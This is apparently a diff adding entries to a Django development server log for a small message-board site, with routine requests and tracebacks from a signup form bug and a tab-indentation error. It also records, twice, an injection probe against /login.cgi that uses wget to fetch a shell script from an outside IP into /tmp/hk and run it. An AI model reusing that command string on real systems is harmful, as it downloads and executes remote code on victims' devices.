@@ -298,3 +298,190 @@ True
 [05/Sep/2018 05:49:40] "GET /signin/ HTTP/1.1" 200 1646
 [05/Sep/2018 05:49:42] "POST /signin/ HTTP/1.1" 302 0
 [05/Sep/2018 05:49:42] "GET / HTTP/1.1" 200 3255
+[05/Sep/2018 05:53:00] "GET /board/5 HTTP/1.1" 301 0
+[05/Sep/2018 05:53:00] "GET /board/5/ HTTP/1.1" 200 1997
+[05/Sep/2018 05:53:00] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 05:53:01] "GET /board/5/edit HTTP/1.1" 200 1699
+[05/Sep/2018 05:53:09] "POST /board/5/edit HTTP/1.1" 302 0
+[05/Sep/2018 05:53:09] "GET /board/5/ HTTP/1.1" 200 1998
+[05/Sep/2018 05:53:10] "GET / HTTP/1.1" 200 3256
+[05/Sep/2018 05:53:16] "GET /board/ HTTP/1.1" 200 1687
+[05/Sep/2018 05:53:22] "GET /board/6/ HTTP/1.1" 200 3635
+[05/Sep/2018 05:53:23] "GET /board/6/edit HTTP/1.1" 200 3329
+[05/Sep/2018 05:53:26] "POST /board/6/edit HTTP/1.1" 302 0
+[05/Sep/2018 05:53:26] "GET /board/6/ HTTP/1.1" 200 3631
+[05/Sep/2018 05:53:27] "GET / HTTP/1.1" 200 3254
+[05/Sep/2018 05:53:35] "GET /board/6/ HTTP/1.1" 200 3631
+[05/Sep/2018 05:53:36] "GET /board/6/edit HTTP/1.1" 200 3327
+[05/Sep/2018 05:53:39] "GET /board/ HTTP/1.1" 200 1687
+[05/Sep/2018 05:53:39] "GET / HTTP/1.1" 200 3254
+[05/Sep/2018 05:53:40] "GET /board/ HTTP/1.1" 200 1687
+[05/Sep/2018 05:53:40] "GET / HTTP/1.1" 200 3254
+[05/Sep/2018 05:54:08] "GET /signout/ HTTP/1.1" 302 0
+[05/Sep/2018 05:54:08] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 05:54:14] "GET /board/ HTTP/1.1" 200 1589
+Not Found: /login.cgi
+[05/Sep/2018 05:56:43] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.87.77.250/izuku.sh%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3972
+[05/Sep/2018 06:00:03] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 06:00:03] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 06:00:03] "GET /board/ HTTP/1.1" 200 1589
+[05/Sep/2018 06:02:02] "GET /signin/ HTTP/1.1" 200 1646
+[05/Sep/2018 06:02:09] "POST /signin/ HTTP/1.1" 302 0
+[05/Sep/2018 06:02:09] "GET / HTTP/1.1" 200 3254
+[05/Sep/2018 06:02:11] "GET /board/ HTTP/1.1" 200 1687
+[05/Sep/2018 06:05:21] "GET /signup/ HTTP/1.1" 200 1771
+[05/Sep/2018 06:05:21] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 06:08:32] "GET /signout/ HTTP/1.1" 302 0
+[05/Sep/2018 06:08:32] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 06:08:32] "GET /signin/ HTTP/1.1" 200 1646
+[05/Sep/2018 06:10:57] "GET /board/ HTTP/1.1" 200 1589
+[05/Sep/2018 06:10:57] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 06:10:58] "GET /board/4/ HTTP/1.1" 200 1563
+[05/Sep/2018 06:10:58] "GET /board/ HTTP/1.1" 200 1589
+[05/Sep/2018 06:10:59] "GET /board/6/ HTTP/1.1" 200 3058
+[05/Sep/2018 06:10:59] "GET /board/ HTTP/1.1" 200 1589
+[05/Sep/2018 06:11:00] "GET /board/5/ HTTP/1.1" 200 1425
+[05/Sep/2018 06:11:01] "GET /board/ HTTP/1.1" 200 1589
+[05/Sep/2018 06:11:02] "GET /board/4/ HTTP/1.1" 200 1563
+[05/Sep/2018 06:11:03] "GET /signin/ HTTP/1.1" 200 1646
+[05/Sep/2018 06:11:09] "POST /signin/ HTTP/1.1" 200 5
+[05/Sep/2018 06:11:11] "GET /signin/ HTTP/1.1" 200 1646
+[05/Sep/2018 06:11:14] "POST /signin/ HTTP/1.1" 302 0
+[05/Sep/2018 06:11:14] "GET / HTTP/1.1" 200 3254
+[05/Sep/2018 06:11:15] "GET /board/ HTTP/1.1" 200 1687
+[05/Sep/2018 06:11:16] "GET /board/4/ HTTP/1.1" 200 2248
+[05/Sep/2018 06:11:20] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 06:32:11] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 07:14:38] "GET / HTTP/1.0" 200 3251
+[05/Sep/2018 07:39:09] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 07:48:15] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:21:17] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:21:18] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:21:19] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:21:19] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:21:21] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:21:22] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:21:23] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:21:23] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:21:24] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:21:25] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:29:15] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 08:45:01] "GET / HTTP/1.0" 200 3251
+[05/Sep/2018 09:40:13] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 09:40:13] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 09:40:13] "GET /board/ HTTP/1.1" 200 1589
+[05/Sep/2018 09:40:14] "GET /board/4/ HTTP/1.1" 200 1563
+[05/Sep/2018 09:40:19] "GET /board/ HTTP/1.1" 200 1589
+Not Found: /login.cgi
+[05/Sep/2018 10:00:01] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.87.77.250/izuku.sh%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 404 3972
+[05/Sep/2018 10:12:21] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 10:23:13] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 10:38:44] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 10:38:44] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 11:28:35] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 11:39:31] "GET /signup/ HTTP/1.1" 200 1768
+[05/Sep/2018 11:39:31] "GET /static/css/board.css?ver=2 HTTP/1.1" 304 0
+[05/Sep/2018 11:40:11] "POST /signup/ HTTP/1.1" 200 1890
+Performing system checks...
+
+System check identified no issues (0 silenced).
+September 05, 2018 - 05:48:33
+Django version 2.1, using settings 'mysite.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+True
+True
+True
+Internal Server Error: /signup/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/usr/local/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/python/mysite/board/views.py", line 107, in signup
+    if form.is_valid():
+  File "/usr/local/lib/python3.7/site-packages/django/forms/forms.py", line 185, in is_valid
+    return self.is_bound and not self.errors
+  File "/usr/local/lib/python3.7/site-packages/django/forms/forms.py", line 180, in errors
+    self.full_clean()
+  File "/usr/local/lib/python3.7/site-packages/django/forms/forms.py", line 382, in full_clean
+    self._clean_form()
+  File "/usr/local/lib/python3.7/site-packages/django/forms/forms.py", line 409, in _clean_form
+    cleaned_data = self.clean()
+  File "/python/mysite/board/forms.py", line 20, in clean
+    cleaned_data = super(UserSignForm, self).clean()
+NameError: name 'UserSignForm' is not defined
+[05/Sep/2018 11:47:04] "POST /signup/ HTTP/1.1" 500 81979
+Performing system checks...
+
+System check identified no issues (0 silenced).
+September 05, 2018 - 11:47:01
+Django version 2.1, using settings 'mysite.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+[05/Sep/2018 11:47:19] "POST /signup/ HTTP/1.1" 200 1980
+[05/Sep/2018 11:47:24] "GET / HTTP/1.1" 200 3251
+[05/Sep/2018 11:47:26] "GET /signup/ HTTP/1.1" 200 1768
+Performing system checks...
+
+System check identified no issues (0 silenced).
+September 05, 2018 - 11:47:17
+Django version 2.1, using settings 'mysite.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+Unhandled exception in thread started by <function check_errors.<locals>.wrapper at 0x7f6a9dac86a8>
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.7/site-packages/django/utils/autoreload.py", line 225, in wrapper
+    fn(*args, **kwargs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/commands/runserver.py", line 117, in inner_run
+    self.check(display_num_errors=True)
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/base.py", line 379, in check
+    include_deployment_checks=include_deployment_checks,
+  File "/usr/local/lib/python3.7/site-packages/django/core/management/base.py", line 366, in _run_checks
+    return checks.run_checks(**kwargs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/registry.py", line 71, in run_checks
+    new_errors = check(app_configs=app_configs)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/urls.py", line 40, in check_url_namespaces_unique
+    all_namespaces = _load_all_namespaces(resolver)
+  File "/usr/local/lib/python3.7/site-packages/django/core/checks/urls.py", line 57, in _load_all_namespaces
+    url_patterns = getattr(resolver, 'url_patterns', [])
+  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 533, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.7/site-packages/django/urls/resolvers.py", line 526, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/local/lib/python3.7/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/python/mysite/mysite/urls.py", line 24, in <module>
+    path('', include('board.urls')),
+  File "/usr/local/lib/python3.7/site-packages/django/urls/conf.py", line 34, in include
+    urlconf_module = import_module(urlconf_module)
+  File "/usr/local/lib/python3.7/importlib/__init__.py", line 127, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/python/mysite/board/urls.py", line 3, in <module>
+    from . import views
+  File "/python/mysite/board/views.py", line 8, in <module>
+    from .forms import BoardForm, UserSignupForm, UserSigninForm, CommentForm
+  File "/python/mysite/board/forms.py", line 14
+    confirm_password=forms.CharField(widget=forms.PasswordInput())
+                                                                 ^
+TabError: inconsistent use of tabs and spaces in indentation
+Performing system checks...
+
